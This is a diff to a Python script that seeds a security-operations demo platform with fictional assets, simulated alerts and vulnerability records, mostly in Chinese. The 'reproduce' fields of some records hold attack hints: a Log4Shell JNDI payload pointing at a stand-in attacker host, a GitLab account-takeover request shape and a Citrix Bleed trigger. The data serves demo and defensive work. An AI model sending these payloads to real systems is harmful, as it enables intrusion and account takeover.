@@ -45,7 +45,7 @@ from models.correlated_event import CorrelatedEvent
 from models.correlation_rule import CorrelationRule
 from models.ioc_hit import IOCHitDB
 from models.monitor_history import MonitorHistoryModel
-from models.playbook_definition import PlaybookDefinitionModel
+from models.playbook_definition import PlaybookDefinitionModel, PlaybookTriggerModel
 from models.playbook_run import PlaybookRunModel, PlaybookRunStepModel
 from models.security_alert import SecurityAlert
 from models.security_vulnerability import (
@@ -55,6 +55,7 @@ from models.security_vulnerability import (
     VulnerabilityType,
 )
 from models.siem_log import SIEMLog
+from models.trigger import TriggerInvocationModel
 
 DEMO_NS = uuid.UUID("5eed0000-0000-4000-8000-00c0ffee0000")
 NOW = datetime.now(UTC)
@@ -119,44 +120,135 @@ def geoip(ip: str) -> dict | None:
 
 # (hostname, ip, owner, business, criticality, tags, notes)
 ASSETS = [
+    # ── 生产核心 VPC (10.0.x.x) ──
+    ("prod-gateway-kong-01", "10.0.10.20", "li.qiang", "电商平台", "critical",
+     "api,kong,prod,gateway,pci-dss", "对外核心 API 网关（Kong 3.6 / Linux 6.1），PCI-DSS 范围"),
+    ("prod-gateway-kong-02", "10.0.10.21", "li.qiang", "电商平台", "critical",
+     "api,kong,prod,gateway,pci-dss", "对外核心 API 网关（双活冗余节点）"),
+    ("prod-ingress-nginx-01", "10.0.10.15", "chen.hao", "应用路由", "critical",
+     "ingress,nginx,k8s,prod", "K8s Ingress 外部流量接入与 TLS 终结代理"),
     ("web-prod-01", "10.0.10.11", "li.qiang", "电商平台", "critical",
-     "web,nginx,prod", "官方商城前端，PCI-DSS 范围内资产"),
+     "web,nginx,prod,pci-dss", "官方商城前端，Nginx 1.24，PCI-DSS 范围内核心资产"),
     ("web-prod-02", "10.0.10.12", "li.qiang", "电商平台", "critical",
-     "web,nginx,prod", "官方商城前端（灰度节点）"),
-    ("api-gateway-01", "10.0.10.20", "li.qiang", "电商平台", "critical",
-     "api,kong,prod", "对外 API 网关（Kong 3.6）"),
+     "web,nginx,prod,pci-dss", "官方商城前端（灰度与容灾节点）"),
+    ("prod-user-service-01", "10.0.15.10", "zhao.min", "用户中心", "critical",
+     "microservice,java,spring-boot,prod", "用户认证与会员中心核心微服务（JDK 17 / Spring Boot 3.2）"),
+    ("prod-user-service-02", "10.0.15.11", "zhao.min", "用户中心", "critical",
+     "microservice,java,spring-boot,prod", "用户中心微服务（高可用节点）"),
+    ("prod-payment-service-01", "10.0.15.20", "zhao.min", "支付结算", "critical",
+     "microservice,golang,pci-dss,core-tier1", "核心支付交易与清结算引擎，PCI-DSS 最高防护等级"),
+    ("prod-payment-service-02", "10.0.15.21", "zhao.min", "支付结算", "critical",
+     "microservice,golang,pci-dss,core-tier1", "核心支付交易结算（双活热备节点）"),
+    ("prod-order-service-01", "10.0.15.30", "li.qiang", "订单中心", "critical",
+     "microservice,java,spring-boot,prod", "电商主订单创建、履约与库存校验微服务"),
+    ("prod-order-service-02", "10.0.15.31", "li.qiang", "订单中心", "critical",
+     "microservice,java,spring-boot,prod", "订单中心微服务（高并发集群节点）"),
+    ("prod-auth-sso-01", "10.0.15.5", "admin", "统一身份认证", "critical",
+     "sso,oauth2,keycloak,prod", "企业与客户统一身份认证中心（Keycloak 24.0），集成 MFA 与 SAML"),
+    ("prod-kafka-broker-01", "10.0.25.11", "chen.hao", "消息中枢", "critical",
+     "kafka,mq,prod,cluster", "Kafka 核心消息队列集群 Broker 01（承载订单与支付流水）"),
+    ("prod-kafka-broker-02", "10.0.25.12", "chen.hao", "消息中枢", "critical",
+     "kafka,mq,prod,cluster", "Kafka 核心消息队列集群 Broker 02"),
+    ("prod-kafka-broker-03", "10.0.25.13", "chen.hao", "消息中枢", "critical",
+     "kafka,mq,prod,cluster", "Kafka 核心消息队列集群 Broker 03"),
+    ("prod-rabbitmq-cluster-01", "10.0.25.20", "chen.hao", "任务调度", "high",
+     "rabbitmq,mq,prod", "交易异步回调与延迟重试队列 RabbitMQ 3.12"),
+    ("prod-pg-master-01", "10.0.20.20", "zhao.min", "支付数据库", "critical",
+     "database,postgresql,patroni,prod,pci-dss", "PostgreSQL 16 支付主库（Patroni HA + 物理流复制）"),
+    ("prod-pg-replica-01", "10.0.20.21", "zhao.min", "支付数据库", "critical",
+     "database,postgresql,replica,prod", "PostgreSQL 16 支付从库（只读查询与容灾备份）"),
     ("db-mysql-prod", "10.0.20.10", "zhao.min", "订单数据库", "critical",
-     "database,mysql,prod", "MySQL 8.0 主库，承载订单与支付数据"),
+     "database,mysql,mha,prod", "MySQL 8.0 主库，承载全站订单与资金往来流水"),
+    ("prod-mysql-order-02", "10.0.20.11", "zhao.min", "订单数据库", "critical",
+     "database,mysql,replica,prod", "MySQL 8.0 订单从库，承载数据统计与对账导出"),
     ("db-redis-cache", "10.0.20.15", "zhao.min", "电商平台", "high",
-     "cache,redis,prod", "Redis 7 会话与热点缓存"),
-    ("dc-dc01", "10.0.1.10", "admin", "办公网-AD", "critical",
-     "domain-controller,windows", "主域控，Server 2019"),
-    ("dc-dc02", "10.0.1.11", "admin", "办公网-AD", "critical",
-     "domain-controller,windows", "辅域控"),
-    ("filesrv-01", "10.0.1.20", "wang.fang", "文件共享", "critical",
-     "fileserver,windows,smb", "部门文件服务器，含财务共享目录"),
-    ("mail-exch-01", "10.0.1.30", "wang.fang", "邮件系统", "high",
-     "mail,exchange", "Exchange 2019 内部邮件"),
-    ("backup-nas-01", "10.0.40.5", "admin", "备份系统", "high",
-     "backup,nas", "异地备份 NAS，Veeam 存储库"),
+     "cache,redis,sentinel,prod", "Redis 7.2 会话状态与分布式锁 Master 节点"),
+    ("prod-redis-sentinel-02", "10.0.20.16", "zhao.min", "电商平台", "high",
+     "cache,redis,sentinel,prod", "Redis 7.2 会话状态与热点缓存 Slave 节点"),
+    ("prod-mongo-analytics-01", "10.0.20.30", "zhao.min", "数据分析", "medium",
+     "database,mongodb,prod", "MongoDB 7.0 用户行为、搜索历史与前端埋点存储"),
+    ("prod-minio-oss-01", "10.0.40.10", "chen.hao", "对象存储", "high",
+     "storage,minio,s3,prod", "MinIO 分布式对象存储集群（存储商品大图与电子单据）"),
+    ("prod-es-master-01", "10.0.45.10", "chen.hao", "搜索与日志", "high",
+     "elasticsearch,cluster,prod", "Elasticsearch 8.12 生产搜索与商品全文检索引擎"),
+    ("prod-es-data-01", "10.0.45.11", "chen.hao", "搜索与日志", "high",
+     "elasticsearch,data-node,prod", "Elasticsearch 数据节点 01（承载商品倒排索引与热点日志）"),
     ("k8s-node-01", "10.0.30.11", "chen.hao", "容器平台", "high",
-     "kubernetes,prod", "K8s 生产节点"),
+     "kubernetes,worker,prod", "K8s 生产工作节点 01（承载电商核心微服务 Pod）"),
     ("k8s-node-02", "10.0.30.12", "chen.hao", "容器平台", "high",
-     "kubernetes,prod", "K8s 生产节点"),
+     "kubernetes,worker,prod", "K8s 生产工作节点 02（高负载交易 Pod 调度）"),
+    ("prod-k8s-gpu-01", "10.0.30.20", "chen.hao", "AI算力平台", "high",
+     "kubernetes,gpu,nvidia,prod", "AI 风险控制与大模型实时推理节点（NVIDIA A100 80GB）"),
+    ("backup-nas-01", "10.0.40.5", "admin", "备份系统", "high",
+     "backup,nas,veeam,offline", "异地容灾冷备 NAS，Veeam 存储库，配置 WORM 不可变快照"),
+
+    # ── 研发与持续集成环境 (VPC-Dev 10.10.x.x / 10.50.x.x) ──
+    ("dev-gitlab-ce-01", "10.50.10.5", "chen.hao", "代码托管", "critical",
+     "git,gitlab,devops,core-repo", "GitLab CE 16.8 核心代码仓库，存放全公司核心代码与密钥配置"),
+    ("dev-jenkins-01", "10.50.10.10", "chen.hao", "研发效能", "medium",
+     "ci,jenkins,devops", "Jenkins CI 构建中枢，暴露 8080 端口于研发网段"),
+    ("dev-jenkins-agent-01", "10.50.10.11", "chen.hao", "研发效能", "medium",
+     "ci,jenkins-agent,build", "Jenkins 动态构建 Runner 节点，执行自动化单元测试与镜像打包"),
+    ("dev-harbor-registry", "10.50.10.20", "chen.hao", "容器镜像", "high",
+     "docker,harbor,registry", "Harbor 2.10 企业私有容器镜像仓库（集成 Trivy 漏洞门禁）"),
+    ("dev-sonarqube-server", "10.50.10.30", "chen.hao", "代码质量", "medium",
+     "sonarqube,sast,quality", "SonarQube 代码静态安全扫描与 OWASP Top 10 合规检查"),
     ("k8s-node-03", "10.0.30.13", "chen.hao", "容器平台", "medium",
-     "kubernetes,staging", "K8s 预发节点"),
-    ("dev-jenkins-01", "10.0.50.10", "chen.hao", "研发效能", "medium",
-     "ci,jenkins", "Jenkins CI，暴露 8080 端口于研发网段"),
+     "kubernetes,staging,worker", "K8s 预发测试集群工作节点（开发测试隔离域）"),
+
+    # ── DMZ 边界与网络安全层 (172.16.x.x) ──
+    ("dmz-waf-cloudflare-edge", "172.16.0.2", "admin", "边缘防护", "critical",
+     "waf,ddos,cloudflare,edge", "Cloudflare 企业级边缘防护与全球 Anycast DDoS 流量清洗"),
+    ("dmz-waf-nginx-01", "172.16.0.3", "admin", "应用WAF", "critical",
+     "waf,modsecurity,nginx,dmz", "ModSecurity + OWASP Core Rule Set 反向代理 WAF 节点"),
     ("jump-bastion-01", "172.16.0.5", "admin", "运维堡垒机", "critical",
-     "bastion,ssh,dmz", "唯一 SSH 运维入口，已启用 MFA"),
+     "bastion,ssh,dmz,mfa", "JumpServer 运维堡垒机，唯一 SSH 入口，启用 Google Authenticator MFA"),
+    ("dmz-bastion-02", "172.16.0.6", "admin", "运维堡垒机", "critical",
+     "bastion,ssh,dmz,mfa", "JumpServer 堡垒机热备节点，承载只读审计与录屏回放"),
     ("vpn-gw-01", "172.16.0.10", "admin", "远程接入", "critical",
-     "vpn,fortigate", "FortiGate SSL-VPN 网关"),
+     "vpn,fortigate,ssl-vpn,dmz", "FortiGate 600E SSL-VPN 远程办公网关，接入全员双因子认证"),
+    ("dmz-mail-relay-01", "172.16.0.25", "wang.fang", "邮件网关", "high",
+     "mail,postfix,spam-filter,dmz", "Postfix 邮件边界中继网关，内置 SPF/DKIM/DMARC 校验与反垃圾"),
+
+    # ── 企业内网与安全运营平台 (10.1.x.x / 10.100.x.x) ──
+    ("dc-dc01", "10.0.1.10", "admin", "办公网-AD", "critical",
+     "domain-controller,windows,activedirectory", "Windows Server 2022 主域控（corp.acme-corp.cn），承载全员目录权限"),
+    ("dc-dc02", "10.0.1.11", "admin", "办公网-AD", "critical",
+     "domain-controller,windows,activedirectory", "Windows Server 2022 辅助域控，与主域控双向实时同步"),
+    ("filesrv-01", "10.0.1.20", "wang.fang", "文件共享", "critical",
+     "fileserver,windows,smb,finance-share", "部门文件服务器（SMB 3.0），存放财务、法务与高管核心共享目录"),
+    ("mail-exch-01", "10.0.1.30", "wang.fang", "邮件系统", "high",
+     "mail,exchange,windows", "Exchange Server 2019 内部邮件系统"),
+    ("sec-wazuh-manager-01", "10.100.1.10", "admin", "安全运营", "critical",
+     "siem,wazuh,manager,sec-ops", "Wazuh 4.8 HIDS 主机安全管理中枢与实时规则关联引擎"),
+    ("sec-suricata-ids-01", "10.100.1.20", "admin", "网络安全", "high",
+     "ids,suricata,nids,sensor", "Suricata 7.0 骨干网络旁路 NIDS 探针，全天候捕获异常入侵流量"),
+    ("sec-zeek-sensor-01", "10.100.1.25", "admin", "网络分析", "high",
+     "nsm,zeek,traffic-analysis", "Zeek 6.2 流量安全元数据分析传感器，提取 TLS/DNS/HTTP 会话指纹"),
+
+    # ── 关键岗位终端与办公设备 (192.168.x.x) ──
     ("fin-laptop-liu", "192.168.20.15", "liu.yiming", "财务系统", "high",
-     "endpoint,windows,finance", "财务部 Windows 11 终端"),
-    ("hr-laptop-wang", "192.168.20.22", "wang.xiaotong", "人力资源", "medium",
-     "endpoint,windows", "HR 部 Windows 终端"),
+     "endpoint,windows,finance,confidential", "财务部资金主管 Windows 11 专机（已部署 EDR 实时防护与 DLP 策略）"),
+    ("fin-ws-chen", "192.168.20.18", "chen.dan", "财务系统", "high",
+     "endpoint,windows,finance", "财务出纳专用台式机，承载网上银行 USB Key 与对账客户端"),
     ("it-laptop-zhang", "192.168.10.21", "zhang.wei", "IT 运维", "medium",
-     "endpoint,macos", "IT 运维 macOS 终端，具有跳板权限"),
+     "endpoint,macos,ops,privileged", "IT 基础架构与运维专家 MacBook Pro 终端，具备堡垒机管理权限"),
+    ("ops-win-li", "192.168.10.22", "li.qiang", "SRE团队", "high",
+     "endpoint,windows,sre", "SRE 运维主管工作机，具备生产网络跳板访问权限"),
+    ("dev-mbp-wang", "192.168.10.35", "wang.lei", "核心研发", "medium",
+     "endpoint,macos,developer", "电商架构师 MacBook Pro，具备 GitLab Maintainer 与 K8s 调试权限"),
+    ("hr-laptop-wang", "192.168.20.22", "wang.xiaotong", "人力资源", "medium",
+     "endpoint,windows,hr", "HR 薪酬专员 Windows 11 终端，具备员工档案与薪资表查阅权限"),
+    ("iot-conf-board-01", "192.168.50.12", "admin", "智能办公", "low",
+     "iot,android,conference", "总部 8 楼大会议室 MAXHUB 智能会议大屏终端（Android 12）"),
+    ("iot-door-controller-01", "192.168.50.20", "admin", "安防门禁", "medium",
+     "iot,embedded,door-access", "机房与财务办公区人脸识别智能门禁控制器"),
+
+    # ── 公有云原生对象 ──
+    ("aws-s3-finance-exports", "172.31.0.1", "admin", "云上存储", "critical",
+     "cloud,aws,s3,finance-data", "AWS S3 企业财务报表归档与月结数据导出桶（us-east-1）"),
+    ("aws-rds-aurora-prod", "172.31.10.5", "zhao.min", "云上数据库", "critical",
+     "cloud,aws,rds,aurora,postgresql", "AWS Aurora Serverless v2 多可用区核心分析数据库实例"),
 ]
 
 
@@ -640,75 +732,101 @@ def build_story_alerts() -> list[SecurityAlert]:
 
 
 def build_noise_alerts() -> list[SecurityAlert]:
-    """生成 14 天内的例行低危噪音（扫描、失败登录、背景告警）。"""
+    """生成 14 天内的例行低危噪音（端口扫描、失败登录、背景告警等 135+ 条）。"""
     alerts = []
-    scan_ips = ["196.52.43.54", "5.188.206.130", "118.25.6.39", "222.186.18.35", "141.98.10.60"]
-    web_agents = ["web-prod-01", "web-prod-02", "api-gateway-01"]
+    scan_ips = list(EXT_IPS.keys())
+    web_agents = ["web-prod-01", "web-prod-02", "prod-gateway-kong-01", "dmz-waf-nginx-01"]
 
-    for i in range(28):  # 端口扫描
-        hour = 6 + i * 11.7
+    # 1. 互联网扫描器 (45 条)
+    for i in range(45):
+        hour = 3 + i * 7.2
         src = scan_ips[i % len(scan_ips)]
         agent = web_agents[i % len(web_agents)]
         created = ago(hours=hour)
-        resolved = i % 3 == 0
+        resolved = i % 2 == 0
         alerts.append(SecurityAlert(
-            source="suricata", external_event_id=f"DEMO-NOISE-SCAN-{i:02d}",
+            source="suricata", external_event_id=f"DEMO-NOISE-SCAN-{i:03d}",
             event_type="reconnaissance", severity="low",
-            title="ET SCAN Suspicious inbound to database / management ports",
-            description=f"来自 {src} 的端口扫描（445/3306/5432/6379），无后续利用行为。",
+            title="ET SCAN Suspicious inbound to web & database management ports",
+            description=f"来自 {src} 的端口与服务指纹探测（80/443/3306/5432/6379/8080），无后续利用行为。",
             source_ip=src, destination_ip="10.0.10.11", protocol="TCP",
             agent_name=agent, rule_id="2019241", rule_level=3,
             rule_groups="scan,recon", mitre_tactics="Discovery", mitre_techniques=["T1046"],
             geoip=geoip(src), location="/var/log/suricata/eve.json",
             status="resolved" if resolved else "false_positive",
-            resolution_note="已加入黑洞路由。" if resolved else "背景扫描噪音。",
+            resolution_note="已加入边界黑洞路由阻断。" if resolved else "互联网自动化扫描背景噪音。",
             resolved_by="admin" if resolved else None,
             resolved_at=ago(hours=hour - 0.1) if resolved else None,
             threat_score=12, classification="false_positive",
-            tags=["scan", "noise"], aggregated_count=4 + i % 9,
-            last_seen_at=created + timedelta(minutes=9),
+            tags=["scan", "noise"], aggregated_count=5 + i % 12,
+            last_seen_at=created + timedelta(minutes=8),
             is_aggregated=1,
             fingerprint=sha(f"scan|{src}"), created_at=created, updated_at=created,
             event_timestamp=created,
         ))
 
-    for i in range(18):  # SSH 非存在用户 / 认证失败
-        hour = 4 + i * 18.3
+    # 2. SSH 认证失败与字典嗅探 (35 条)
+    for i in range(35):
+        hour = 2 + i * 9.5
         src = scan_ips[(i + 2) % len(scan_ips)]
         created = ago(hours=hour)
         alerts.append(SecurityAlert(
-            source="wazuh", external_event_id=f"DEMO-NOISE-AUTH-{i:02d}",
+            source="wazuh", external_event_id=f"DEMO-NOISE-AUTH-{i:03d}",
             event_type="brute_force", severity="low",
-            title="SSHD: Attempt to login using a non-existent user",
-            description=f"针对不存在账户的 SSH 登录尝试，来源 {src}。",
+            title="SSHD: Attempt to login using a non-existent or invalid user",
+            description=f"针对不存在账户（guest, test, test1, oracle, ftp）的 SSH 登录尝试，来源 {src}。",
             source_ip=src, destination_ip="172.16.0.5", protocol="TCP",
             agent_name="jump-bastion-01", rule_id="5710", rule_level=5,
             rule_groups="sshd,authentication_failures",
             mitre_tactics="Credential Access", mitre_techniques=["T1110.001"],
             geoip=geoip(src), location="/var/log/auth.log",
             status="false_positive",
-            resolution_note="互联网背景噪音，fail2ban 自动处置。",
+            resolution_note="互联网背景噪音，fail2ban 自动处置与临时封锁。",
             threat_score=8, classification="false_positive",
-            tags=["ssh", "noise"], aggregated_count=6 + i % 15,
-            last_seen_at=created + timedelta(minutes=3), is_aggregated=1,
+            tags=["ssh", "noise"], aggregated_count=8 + i % 20,
+            last_seen_at=created + timedelta(minutes=4), is_aggregated=1,
             fingerprint=sha(f"auth|{src}"), created_at=created, updated_at=created,
             event_timestamp=created,
         ))
 
-    for i in range(9):  # 终端防护自动处置
-        hour = 10 + i * 36
-        agents = ["hr-laptop-wang", "fin-laptop-liu", "it-laptop-zhang"]
+    # 3. 终端 EDR 实时阻断与清理 (25 条)
+    agents = ["hr-laptop-wang", "fin-laptop-liu", "it-laptop-zhang", "dev-mbp-wang", "fin-ws-chen"]
+    for i in range(25):
+        hour = 5 + i * 13.2
+        target_agent = agents[i % len(agents)]
         created = ago(hours=hour)
         alerts.append(SecurityAlert(
-            source="osquery", external_event_id=f"DEMO-NOISE-EDR-{i:02d}",
+            source="osquery", external_event_id=f"DEMO-NOISE-EDR-{i:03d}",
             event_type="malware", severity="info",
-            title="EDR: potentially unwanted program blocked in real-time",
-            description="捆绑安装器/广告插件被实时防护阻断，无需人工处理。",
-            destination_ip="192.168.20.22", agent_name=agents[i % 3],
+            title="EDR: Potentially unwanted program (PUA) blocked in real-time",
+            description="员工下载软件捆绑的流氓广告插件/推广安装包，已被终端安全 Agent 秒级拦截并移入隔离区。",
+            destination_ip="192.168.20.22", agent_name=target_agent,
             rule_id="edr-pua", rule_level=3, rule_groups="malware,quarantined",
-            status="resolved", resolution_note="EDR 自动处置。",
+            status="resolved", resolution_note="EDR 引擎自动查杀并清除临时文件。",
             resolved_by="admin", resolved_at=created + timedelta(minutes=1),
             threat_score=5, classification="true_positive", tags=["edr", "noise"],
+            created_at=created, updated_at=created, event_timestamp=created,
+        ))
+
+    # 4. API 网关非正常调用与爬虫频控 (30 条)
+    api_agents = ["prod-gateway-kong-01", "prod-gateway-kong-02", "prod-ingress-nginx-01"]
+    for i in range(30):
+        hour = 1 + i * 11.0
+        src = scan_ips[(i + 4) % len(scan_ips)]
+        created = ago(hours=hour)
+        alerts.append(SecurityAlert(
+            source="modsecurity", external_event_id=f"DEMO-NOISE-API-{i:03d}",
+            event_type="web_attack", severity="low",
+            title="API Gateway: Rate limit exceeded & high-frequency 404 probing",
+            description=f"来自 {src} 的恶意高频接口遍历，超过限流阈值触发 WAF 熔断封禁（5分钟内触发 120 次 404）。",
+            source_ip=src, destination_ip="10.0.10.20", protocol="HTTP",
+            agent_name=api_agents[i % len(api_agents)], rule_id="kong-rate-limit", rule_level=4,
+            rule_groups="waf,api,rate_limit", mitre_tactics="Discovery", mitre_techniques=["T1087"],
+            geoip=geoip(src), location="/var/log/kong/access.log",
+            status="resolved", resolution_note="Kong 限流插件自动返回 429 并临时封禁客户端 IP。",
+            resolved_by="admin", resolved_at=created + timedelta(minutes=2),
+            threat_score=15, classification="false_positive",
+            tags=["api", "rate-limit", "crawler"],
             created_at=created, updated_at=created, event_timestamp=created,
         ))
 
@@ -1096,64 +1214,93 @@ CORRELATED_EVENTS: list[dict] = [
 
 VULNERABILITIES: list[dict] = [
     {"cve": "CVE-2023-4966", "title": "Citrix Bleed — NetScaler ADC 会话令牌泄露",
-         "description": "NetScaler ADC / Gateway 在特定配置下泄露有效会话令牌，攻击者可绕过 MFA 劫持 VPN 会话，已被多个勒索组织在野利用。",
-         "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.AUTHENTICATION_BYPASS,
-         "status": VulnerabilityStatus.IN_PROGRESS, "component": "NetScaler ADC", "version": "13.1-48.47",
-         "vector": "网络（公网暴露的 VPN 网关）", "impact": "VPN 会话劫持 → 内网横向移动入口",
-         "reproduce": "向 /oauth/idp/.well-known/openid-configuration 发送超长 Host 头并读取响应泄漏的会话令牌",
-         "fix": "升级至 13.1-49.15+，升级后强制注销全部活动会话", "reporter": "trivy-scanner", "reported_h": 12,
-         "cvss": 9.4, "triaged_h": 11, "in_progress_h": 10},
+     "description": "NetScaler ADC / Gateway 在特定配置下泄露有效会话令牌，攻击者可绕过 MFA 劫持 VPN 会话，已被多个勒索组织在野利用。",
+     "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.AUTHENTICATION_BYPASS,
+     "status": VulnerabilityStatus.IN_PROGRESS, "component": "NetScaler ADC", "version": "13.1-48.47",
+     "vector": "网络（公网暴露的 VPN 网关）", "impact": "VPN 会话劫持 → 内网横向移动入口",
+     "reproduce": "向 /oauth/idp/.well-known/openid-configuration 发送超长 Host 头并读取响应泄漏的会话令牌",
+     "fix": "升级至 13.1-49.15+，升级后强制注销全部活动会话", "reporter": "trivy-scanner", "reported_h": 12,
+     "cvss": 9.4, "triaged_h": 11, "in_progress_h": 10},
     {"cve": "CVE-2024-6387", "title": "regreSSHion — OpenSSH 信号处理竞态条件 RCE",
-         "description": "OpenSSH 8.5p1-9.7p1 在 SIGALRM 处理中存在竞态条件，未认证远程代码执行。",
-         "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
-         "status": VulnerabilityStatus.TRIAGED, "component": "OpenSSH", "version": "9.2p1",
-         "vector": "网络（SSH 22 端口公网可达）", "impact": "堡垒机被预认证 RCE 的理论路径",
-         "reproduce": "高并发连接竞争 SIGALRM 窗口（平均需约 1 万次尝试）",
-         "fix": "升级 OpenSSH 9.8p1+；临时缓解设置 LoginGraceTime=0", "reporter": "trivy-scanner", "reported_h": 30,
-         "cvss": 8.1, "triaged_h": 28},
-    {"cve": "CVE-2024-21626", "title": "runc 工作目录泄露导致容器逃逸",
-         "description": "runc ≤1.1.11 的内部文件描述符泄露允许容器进程访问宿主机文件系统。",
-         "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
-         "status": VulnerabilityStatus.TRIAGED, "component": "runc / containerd", "version": "runc 1.1.10",
-         "vector": "本地（需已具备构建/运行容器权限）", "impact": "预发节点容器逃逸",
-         "reproduce": "以恶意 WORKDIR 构建镜像并运行",
-         "fix": "随 K8s 1.29 升级 containerd 1.7.16+（runc 1.1.12）", "reporter": "trivy-scanner", "reported_h": 55,
-         "cvss": 8.6, "triaged_h": 52},
+     "description": "OpenSSH 8.5p1-9.7p1 在 SIGALRM 处理中存在竞态条件，未认证远程代码执行。",
+     "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.TRIAGED, "component": "OpenSSH", "version": "9.2p1",
+     "vector": "网络（SSH 22 端口公网可达）", "impact": "堡垒机被预认证 RCE 的理论路径",
+     "reproduce": "高并发连接竞争 SIGALRM 窗口（平均需约 1 万次尝试）",
+     "fix": "升级 OpenSSH 9.8p1+；临时缓解设置 LoginGraceTime=0", "reporter": "trivy-scanner", "reported_h": 30,
+     "cvss": 8.1, "triaged_h": 28},
+    {"cve": "CVE-2024-21626", "title": "runC 工作目录泄露导致容器逃逸",
+     "description": "runc ≤1.1.11 的内部文件描述符泄露允许容器进程访问宿主机文件系统。",
+     "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.TRIAGED, "component": "runc / containerd", "version": "runc 1.1.10",
+     "vector": "本地（需已具备构建/运行容器权限）", "impact": "预发节点容器逃逸",
+     "reproduce": "以恶意 WORKDIR 构建镜像并运行",
+     "fix": "随 K8s 1.29 升级 containerd 1.7.16+（runc 1.1.12）", "reporter": "trivy-scanner", "reported_h": 55,
+     "cvss": 8.6, "triaged_h": 52},
+    {"cve": "CVE-2023-7028", "title": "GitLab 任意密码重置导致账户接管",
+     "description": "GitLab 允许向未经身份验证的次要电子邮件地址发送密码重置链接，导致账户接管（CVSS 10.0）。",
+     "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.AUTHENTICATION_BYPASS,
+     "status": VulnerabilityStatus.IN_PROGRESS, "component": "GitLab CE", "version": "16.8.0",
+     "vector": "网络（Web 接口）", "impact": "代码仓库最高权限丢失，CI/CD 供应链投毒",
+     "reproduce": "POST /users/password 携带多个 user[email][] 参数",
+     "fix": "升级至 GitLab 16.8.2 / 16.7.4 / 16.5.8 及以上版本", "reporter": "trivy-scanner", "reported_h": 16,
+     "cvss": 10.0, "triaged_h": 15, "in_progress_h": 14},
     {"cve": "CVE-2023-44487", "title": "HTTP/2 Rapid Reset 拒绝服务",
-         "description": "HTTP/2 协议实现缺陷，攻击者可利用流重置放大造成拒绝服务。",
-         "severity": VulnerabilitySeverity.MEDIUM, "vtype": VulnerabilityType.OTHER,
-         "status": VulnerabilityStatus.VERIFIED, "component": "Nginx (api-gateway)", "version": "1.24.0",
-         "vector": "网络", "impact": "API 网关可用性风险",
-         "reproduce": "以 h2load 高频创建并立即重置 HTTP/2 流",
-         "fix": "已启用 keepalive_requests 限额与 WAF flood 规则", "reporter": "trivy-scanner", "reported_h": 80,
-         "cvss": 7.5, "triaged_h": 78, "in_progress_h": 77, "fixed_h": 76.5, "verified_h": 76},
+     "description": "HTTP/2 协议实现缺陷，攻击者可利用流重置放大造成拒绝服务。",
+     "severity": VulnerabilitySeverity.MEDIUM, "vtype": VulnerabilityType.OTHER,
+     "status": VulnerabilityStatus.VERIFIED, "component": "Nginx (prod-gateway)", "version": "1.24.0",
+     "vector": "网络", "impact": "API 网关可用性风险",
+     "reproduce": "以 h2load 高频创建并立即重置 HTTP/2 流",
+     "fix": "已启用 keepalive_requests 限额与 WAF flood 规则", "reporter": "trivy-scanner", "reported_h": 80,
+     "cvss": 7.5, "triaged_h": 78, "in_progress_h": 77, "fixed_h": 76.5, "verified_h": 76},
     {"cve": "CVE-2021-44228", "title": "Log4Shell — Apache Log4j2 JNDI 注入 RCE",
-         "description": "log4j2 <2.15 的 JNDI lookup 特性允许未认证远程代码执行。",
-         "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
-         "status": VulnerabilityStatus.CLOSED, "component": "log4j-core (Jenkins)", "version": "2.14.1",
-         "vector": "网络（Jenkins 8080 研发网段）", "impact": "研发网段 RCE → 生产镜像投毒跳板",
-         "reproduce": "User-Agent: ${jndi:ldap://attacker/exp}",
-         "fix": "已升级 log4j 2.17.1；CI 加入 Trivy 门禁", "reporter": "trivy-scanner", "reported_h": 300,
-         "cvss": 10.0, "triaged_h": 299, "in_progress_h": 296, "fixed_h": 292, "verified_h": 291, "closed_h": 290},
+     "description": "log4j2 <2.15 的 JNDI lookup 特性允许未认证远程代码执行。",
+     "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
+     "status": VulnerabilityStatus.CLOSED, "component": "log4j-core (Jenkins)", "version": "2.14.1",
+     "vector": "网络（Jenkins 8080 研发网段）", "impact": "研发网段 RCE → 生产镜像投毒跳板",
+     "reproduce": "User-Agent: ${jndi:ldap://attacker/exp}",
+     "fix": "已升级 log4j 2.17.1；CI 加入 Trivy 门禁", "reporter": "trivy-scanner", "reported_h": 300,
+     "cvss": 10.0, "triaged_h": 299, "in_progress_h": 296, "fixed_h": 292, "verified_h": 291, "closed_h": 290},
     {"cve": "CVE-2022-22965", "title": "Spring4Shell — Spring MVC 数据绑定 RCE",
-         "description": "Spring Framework 5.3.0-5.3.17 在 JDK9+ 部署于 Tomcat 时可通过 ClassLoader 数据绑定 RCE。",
-         "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
-         "status": VulnerabilityStatus.FALSE_POSITIVE, "component": "Spring MVC (shop-api)", "version": "5.3.16",
-         "vector": "网络", "impact": "—",
-         "reproduce": "—", "fix": "误报：应用运行于 JDK 8，不满足利用条件；保留跟踪项作为证明",
-         "reporter": "nmap-vuln-scan", "reported_h": 210, "cvss": 9.8, "triaged_h": 205, "closed_h": 200},
+     "description": "Spring Framework 5.3.0-5.3.17 在 JDK9+ 部署于 Tomcat 时可通过 ClassLoader 数据绑定 RCE。",
+     "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
+     "status": VulnerabilityStatus.FALSE_POSITIVE, "component": "Spring MVC (prod-user-service)", "version": "5.3.16",
+     "vector": "网络", "impact": "—",
+     "reproduce": "—", "fix": "误报：应用运行于 JDK 8，不满足利用条件；保留跟踪项作为证明",
+     "reporter": "nmap-vuln-scan", "reported_h": 210, "cvss": 9.8, "triaged_h": 205, "closed_h": 200},
+    {"cve": "CVE-2024-3094", "title": "XZ Utils 供应链投毒后门",
